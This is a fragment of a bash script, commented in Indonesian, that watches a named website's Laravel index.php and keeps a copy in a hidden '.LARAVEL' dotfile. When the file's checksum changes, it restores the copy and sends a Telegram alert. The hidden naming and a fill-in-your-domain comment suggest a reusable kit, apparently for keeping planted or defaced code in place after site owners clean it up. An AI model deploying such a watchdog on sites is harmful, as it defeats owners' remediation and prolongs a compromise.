...
INDEX_FILE="/home/myungjxp/starholidaysonline.com/public/index.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/myungjxp/starholidaysonline.com/"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/.LARAVEL"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://www.starholidaysonline.com/."
            send_telegram_notification "https://www.starholidaysonline.com/index.php. File index.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
